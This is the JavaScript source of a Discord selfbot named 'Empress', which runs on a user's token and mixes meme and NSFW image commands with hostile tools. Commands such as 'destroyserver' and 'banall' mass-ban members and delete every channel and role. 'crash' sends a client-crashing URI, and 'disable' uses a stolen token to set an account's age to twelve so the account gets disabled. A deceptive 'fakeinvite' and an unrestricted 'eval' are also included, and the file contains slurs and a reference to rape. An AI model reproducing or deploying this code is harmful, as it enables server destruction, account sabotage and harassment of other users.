const prompt = require('prompt');
const clc = require('cli-color');
const fs = require('fs');
const path = require('path');
const Discord = require('discord.js');
const client = new Discord.Client({disableEveryone: true});
const ms = require('ms')
const randomPuppy = require('random-puppy');
const {platform} = require('os')
const {version}= require("discord.js");
var util = require('util');
const { exec } = require("child_process");
const {PythonShell} = require('python-shell')
lolol();
function lolol(){
    try{
        const content = fs.readFileSync("./config.json");
        const config = JSON.parse(content);
        global.ET = parseInt(config.EmbedTimeout);
        global.PREFIX=config.BOTPREFIX;
        global.WeatherKey=config.OpenWeatherAPIKey;
        global.usertoken = config.USERTOKEN
        global.webhook = config.webhookurl
        try{
            client.login(usertoken);
        } catch(e) {console.log(clc.redBright('Please verify token in config!'))}

    }catch(e){
        console.log(clc.redBright('No config found! Creating config... '))
        console.log(clc.redBright('Copy your token and right click to paste...'))
        prompt.start();
        prompt.get(['USERTOKEN', 'BOTPREFIX'], function (err, result) {
            if (err) { return onErr(err); }
            let info = {
                    "USERTOKEN": result.USERTOKEN,
                    "BOTPREFIX": result.BOTPREFIX,
                    "EmbedTimeout": 15000,
                    "OpenWeatherAPIKey": "",
                    "webhookurl": ""
                }
            console.clear();
            console.log(clc.magenta('Optional: Change embed delete timer and set openweatherAPI key in ./config.json'))
            fs.writeFileSync(path.resolve('./', 'config.json'), JSON.stringify(info)); //pkg path
            lolol();
        });
        
        function onErr(err) {
            console.log(err);
            return 1;
        }
    }
}
const ConsoleTitle = require('node-bash-title');
const { bottom } = require('cli-color/move');
const request = require('request');
const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36";
const fetch = require('node-fetch');
const urban = require('relevant-urban');
const Minesweeper = require('discord.js-minesweeper');
const mappings = (function (object) {
    let output = [];

    for (let key in object) {
        output.push({
            regex: new RegExp(key, 'ig'),
            replacement: object[key]
        });
    }

    return output;
})({
    a: '\u1D00',
    b: '\u0299',
    c: '\u1D04',
    d: '\u1D05',
    e: '\u1D07',
    f: '\uA730',
    g: '\u0262',
    h: '\u029C',
    i: '\u026A',
    j: '\u1D0A',
    k: '\u1D0B',
    l: '\u029F',
    m: '\u1D0D',
    n: '\u0274',
    o: '\u1D0F',
    p: '\u1D18',
    q: '\u0071',
    r: '\u0280',
    s: '\uA731',
    t: '\u1D1B',
    u: '\u1D1C',
    v: '\u1D20',
    w: '\u1D21',
    x: '\u0078',
    y: '\u028F',
    z: '\u1D22'
});

ConsoleTitle("Empress");


client.on("ready", async () =>{
            var center = require('center-align');
            console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns)))
            console.log(clc.red(center(`
▓█████  ███▄ ▄███▓ ██▓███   ██▀███  ▓█████   ██████   ██████ 
▓█   ▀ ▓██▒▀█▀ ██▒▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ 
▒███   ▓██    ▓██░▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   
▒▓█  ▄ ▒██    ▒██ ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒
░▒████▒▒██▒   ░██▒▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒
░░ ▒░ ░░ ▒░   ░  ░▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
░ ░  ░░  ░      ░░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░
░   ░      ░   ░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░  
░  ░       ░               ░        ░  ░      ░        ░  `,process.stdout.columns)))
            console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns)))            
            console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns)))            
            console.log(clc.green.bold(center(`Empress logged in as ${client.user.tag}`,process.stdout.columns)));
            console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns)))
            console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns)))            
            console.log(clc.green.bold(center(`By quiet#0069`,process.stdout.columns)));
            console.log(clc.red(center(`========================================================================================================================`,process.stdout.columns)))

});

client.on('message', async message => {
    if(message.content.startsWith('<@')&&message.content.endsWith('>')&&message.content.includes(`${client.user.id}`)||message.mentions.everyone) console.log(clc.blueBright(`${message.author.tag} mentioned you in ${message.channel.name}, ${message.guild.name}`))
    if(message.author.id!==client.user.id) return;
    if(!message.content.startsWith(PREFIX)) return;
    const [cmd, ...args] = message.content.trim().substring(PREFIX.length).split(/\s+/);
        switch(cmd){
            case '8ball':{
                if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                console.log(clc.blueBright(`${cmd} command used`))
                try{
                    var response = await fetch(`https://nekos.life/api/v2/img/8ball`);
                    var data = await response.json();
                    var embed = new Discord.RichEmbed()
                    .setTitle(`8ball says...`)
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setImage(data.url)
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setFooter(`Empress`)
                    .setTimestamp();
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                } catch(e) {console.log(`${cmd} error in response`)}

                break;
                }

                case 'achievement':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    try{
                        var embed = new Discord.RichEmbed()
                        .setTitle("Acheivement Unlocked!")
                        .setDescription(`Achievement unlocked`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage("https://minecraftskinstealer.com/achievement/3/Achievement+Get%21/"+args.join('+'))
                        .setFooter(`Empress`)
                        .setTimestamp()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png');
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}

                    break;
                }

                case 'anal':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekobot.xyz/api/image?type=hanal`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Wink!`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.message)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e){console.log(`${cmd} error in response`)}

                    break;
                }
                case 'animethighs':{
                    try{
                        console.log(clc.blueBright(`${cmd} command used`))
                        message.delete();
                        var response = await fetch(`https://nekobot.xyz/api/image?type=hthigh`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Nyaa`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.message)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'ascii':{
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    message.delete();
                    try{
                        var response = await fetch('https://artii.herokuapp.com/make?text='+args.join('+'))
                        .then(res => res.text())
                        .then(text => message.channel.send('```'+text+'```'));
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'ass':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekobot.xyz/api/image?type=ass`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Wink!`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.message)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'avatar':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    var user = message.mentions.users.first() || client.user;
                    try {
                        message.channel.send("Fetching...").then(m =>{
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Link to avatar`,'',`${user.avatarURL}`)
                        .setURL(`${user.avatarURL}`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setDescription(`Successfully fetched ${user}'s avatar`)
                        .setImage(`${user.avatarURL}`)
                        .setFooter(`Empress`)
                        .setTimestamp();
                    m.edit(embed)
                    setTimeout(function(){m.delete();},ET)
                    });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'baka':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first();
                    message.delete();
                    if(!user) return consolelog(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/baka`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`${user} is baka!`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch(e){console.log(`${cmd} error in response`)}
                    break;
                }

                case 'ban':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user/userID>`)
                    let user = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
                    await user.ban({reason: args[1]}).catch((e)=>console.log('couldnt ban the user'))
                    break;
                }

                case 'banall':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.guild.members.forEach(member => {
                        member.ban().catch(() => {})
                      })
                    break;
                }

                case 'blank':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    message.channel.send(`**\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**`);
                    break;
                }
                case 'blowjob':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/blowjob`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setTitle("Nyaa")
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch (e){console.log(`${cmd} error in response`)}
                    break;
                }
                case 'boobs':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekobot.xyz/api/image?type=boobs`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Wink`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.message)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch (e){console.log(`${cmd} error in response`)}
                    break;
                }
                case 'homies':{

                    break;
                }

                case 'botstats':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    try{
                        let totalSeconds = (client.uptime / 1000);
                        let days = Math.floor(totalSeconds / 86400);
                        totalSeconds %= 86400;
                        let hours = Math.floor(totalSeconds / 3600);
                        totalSeconds %= 3600;
                        let minutes = Math.floor(totalSeconds / 60);
                        let seconds = Math.floor(totalSeconds % 60);
                        let uptime = `${days} days, ${hours} hours, ${minutes} minutes and ${seconds} seconds`;
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Bot Stats`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .addField("Uptime:",`${uptime}`)
                        .addField("Usage:",`RAM ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)}MB \n` + `OS ${platform().replace("win32","Windows").replace("linux","Linux")}`,true)
                        .addField("Bot Info:",`Guilds: ${client.guilds.size.toLocaleString()}\n` 
                        + `Channels: ${client.channels.size.toLocaleString()}\n`
                        + `Users: ${client.users.size.toLocaleString()}`,true)
                        .addField("Miscellaneous:",`Ping ${client.ping.toFixed(2)}ms\n`
                        + `Node ${process.version}\n`
                        + `Discord.Js v${version}`,true)
                        .addField("Dev:",`quiet#0069`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`);
                        message.edit(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET)});
                    } catch (e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'cat':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://api.thecatapi.com/v1/images/search`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Meow!")
                        .setImage(data[0].url)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch (e) {console.log(`${cmd} error in response`)}

                    break;
                }
                case 'changemymind':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    text = args.join('+')
                    message.delete();
                    try{
                        var response = await fetch(`https://nekobot.xyz/api/imagegen?type=changemymind&text=${text}`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Change my mind`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.message)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch (e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'clap':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    try{
                        message.edit(`👏${args.join("👏")}👏`);
                    } catch(e) {console.log('error')}

                    break;
                }

                case 'coinflip':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    function doRandHT() {
                        var rand = ['HEADS!','TAILS!'];
                        return rand[Math.floor(Math.random()*rand.length)];
                    }
                    try{
                        var embed = new Discord.RichEmbed()
                        .setTitle(`The outcome is..`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setDescription(doRandHT())
                        .setThumbnail("https://cdn.discordapp.com/emojis/711194503838433370.gif?v=1")
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch (e){console.log(`${cmd} error in response`)}
                    break;
                }

                case 'color':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <hexcode>`)
                    if(args[0].startsWith('#')) msg = args[0].split('#')[1];
                    else msg = args[0]
                    message.delete();
                    try{
                        var response = await fetch(`https://api.alexflipnote.dev/color/${msg}`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setImage(data.image)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    
                    break;
                }

                case 'crash':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    var user = message.mentions.users.first();
                    if(!user) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    if(user.id===client.user.id) return;
                    else{
                        await user.send("<ms-cxh-full://0>").catch((err)=>{message.console.log('couldnt send crash message')})
                    }
                    break;
                }
                case 'cuteneko':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/neko`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Nyaa")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    }catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'decode':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    var msg = args.join("+")
                    try{
                        var response = await fetch(`https://some-random-api.ml/base64?decode=`+msg);
                        var data = await response.json();
                        message.channel.send(data.text);
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'define':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <word>`)
                    const search = await urban.all(args.join(" "))
                    try {
                        var embed = new Discord.RichEmbed()
                        .setDescription(`**word:** \n ${search[0].word} \n \n **definition 1:** \n ${search[0].definition}\n**example 1** \n ${search[0].example}\n\n **definition 2:** \n ${search[1].definition}\n **example 2** \n ${search[1].example}`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setTitle(`urban dictionary`)
                        message.edit(embed)
                        setTimeout(function(){message.delete();},ET)
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'destroyserver':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.guild.members.forEach(member => {
                        member.ban().catch(() => {})
                      })
          
                      // message.guild.members.forEach(member => {
                      //   member.kick().catch(() => {})
                      // })
                
                      message.guild.channels.forEach(channel => {
                          channel.delete().catch(()=>{})
                        })
          
                      message.guild.roles.forEach(role => {
                        role.delete().catch(() => {})
                      })
                      message.guild.setName("Get Rekt, faggot")
        
                      console.log(`server has been raped!`)
                      break;
                }

                case 'dick':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    message.delete();
                    let user = message.mentions.users.first();
                    let x = Math.floor(Math.random() * 15);
                    dong=""
                    for(var i=0; i<=x;i++){
                        dong+="=";
                    }
                    var embed = new Discord.RichEmbed()
                    .setTitle("Nice cock, bro!")
                    .setDescription(`${user}'s dong is.. \n8${dong}D `)
                    .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                    .setFooter(`Empress`)
                    .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                    .setTimestamp();
                    message.channel.send(embed).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    break;
                }

                case 'disable':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <token>`)
                    token=args[0]
                    let earlier = new Date();
                    earlier.setFullYear(earlier.getFullYear() - 12);
                    request({
                        method: "PATCH",
                        url: "https://canary.discordapp.com/api/v6/users/@me/",
                        headers: {
                            authorization: token,
                            "User-Agent": userAgent
                        },
                        data: {'date_of_birth': `${earlier.getFullYear()}-${earlier.getMonth() + 1}-${earlier.getDate()}`}
                    }, (error, response, body) => {
                        if (!body) return console('no response from server');
                        res = response
                        console.log(res.body)
                        if(response.code === 0)
                        return console.log("Cannot disable this account.");

                        return console.log("Account disabled.");
                      })
                    break;
                }

                case 'dm':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <@user>`)
                    var user = message.mentions.users.first();
                    if(user.id===client.user.id) return;
                    else{
                        await user.send(args.slice(1).join(" ")).catch((err)=>{message.console.log(err);});
                    }
                    break;
                }
                case  'dog':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://api.thedogapi.com/v1/images/search`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Mlem!")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setImage(data[0].url)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'delchannels':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.guild.channels.forEach(channel => {
                        channel.delete().catch(()=>{})
                      })
                  break;
              }
                case 'delroles':{
                    console.log(clc.blueBright(`${cmd} command used`))
                      message.guild.roles.forEach(role => {
                        role.delete().catch(() => {})
                      })

                    break;
                }   

                case 'drake':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    msg = args.join(" ").split(",")
                    var top = msg[0].replace(/\s/g, '+');
                    if(!msg[1]) return console.log(`${cmd} usage: ${PREFIX}${cmd} <top text>, <bottom text>`)
                    var bottom = msg[1].replace(/\s/g, '+');
                    message.delete();
                    try{
                        var embed = new Discord.RichEmbed()
                        .setImage(`https://api.alexflipnote.dev/drake?top=${top}&bottom=${bottom}`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });

                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;                    
                }

                case 'dym':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    msg = args.join(" ").split(",")
                    var top = msg[0].replace(/\s/g, '+');
                    if(!msg[1]) return console.log(`${cmd} usage: ${PREFIX}${cmd} <top text>, <bottom text>`)
                    var bottom = msg[1].replace(/\s/g, '+');
                    try{
                        var embed = new Discord.RichEmbed()
                        .setImage(`https://api.alexflipnote.dev//didyoumean?top=${top}&bottom=${bottom}`)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'editspam':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    msg = args.join(" ");
                    var text=msg.split("");
                    t=""
                    message.channel.send(t).catch((err)=>console.log("sending editspam"));
                    for(let i=0;i<text.length;i++){
                        t+=text[i];
                        message.edit(t)
                    }
                    break;
                }

                case 'embed':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    msg = args.join(" ").split(", ")
                    message.delete();
                    if(!msg[1]) return console.log(`${cmd} usage: ${PREFIX}${cmd} <title>, <description>`)
                    try{
                        var embed = new Discord.RichEmbed()
                        .setTitle(msg[0])
                        .setDescription(msg[1])
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setTimestamp()
                        .setFooter(`Empress`);
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'encode':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    if(args.length<1) return console.log(`${cmd} usage: ${PREFIX}${cmd} <text>`)
                    try{
                        var msg = args.join("+")
                        var response = await fetch(`https://some-random-api.ml/base64?encode=`+msg);
                        var data = await response.json();
                        message.channel.send(data.base64);
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'erofeet':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/erofeet`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Nyaa")
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }
                case 'eval':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    let res
                    try {
                        res = eval(args.join(" "))
                        res = util.inspect(res)
                    } catch (err) {
                        return message.channel.send("", { embed: new Discord.RichEmbed().setTitle("Results").setColor("#FF0000").setDescription(":desktop: **Input**: ```" + args.join("") + "```:eyes: **Error**: ```" + err + "```").setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png').setFooter("Empress") }).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    }
                    message.channel.send("", { embed: new Discord.RichEmbed().setTitle("Results").setColor("#46FF00").setDescription(":desktop: **Input**: ```" + args.join("") + "```:white_check_mark: **Output**: ```" + res + "```").setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png').setFooter("Empress") }).then(m=>{
                        setTimeout(function(){m.delete();},ET);
                    });
                    message.delete();
                    break;
                }
                case 'fact':{
                    message.delete
                    console.log(clc.blueBright(`${cmd} command used`))
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/fact`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle(`Random fact`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setDescription(data.fact)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;

                }
            case 'fakeinvite':{
                if(args[0].startsWith('discord.gg')||args[0].startsWith('https://')||args[0].startsWith('discord.com')) {
                    console.log(`please enter the invite code without discord.gg/ or discord.com/ example: ${PREFIX}fakeinvite pewdiepie HES`)
                    message.delete();
                    return
                }
                message.delete();
                console.log(clc.blueBright(`${cmd} command used`))
                message.channel.send(`discοrd.gg/discord.gg/${args[0]}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||discord.gg/${args[1]}`)
                break;
            
            }

                case 'feed':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    var user = message.mentions.users.first();
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/feed`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setDescription(`Feeding ${user}`)
                        .setThumbnail('https://cdn.discordapp.com/attachments/766750251151261716/767083607923621939/empress.png')
                        .setImage(data.url)
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setFooter(`Empress`)
                        .setTimestamp();
                        message.channel.send(embed).then(m=>{
                            setTimeout(function(){m.delete();},ET);
                        });
                    } catch(e) {console.log(`${cmd} error in response`)}
                    break;
                }

                case 'feet':{
                    console.log(clc.blueBright(`${cmd} command used`))
                    message.delete();
                    try{
                        var response = await fetch(`https://nekos.life/api/v2/img/feetg`);
                        var data = await response.json();
                        var embed = new Discord.RichEmbed()
                        .setTitle("Nyaa")
                        .setColor('#'+Math.floor(Math.random()*16777215).toString(16))
                        .setImage(data.url)
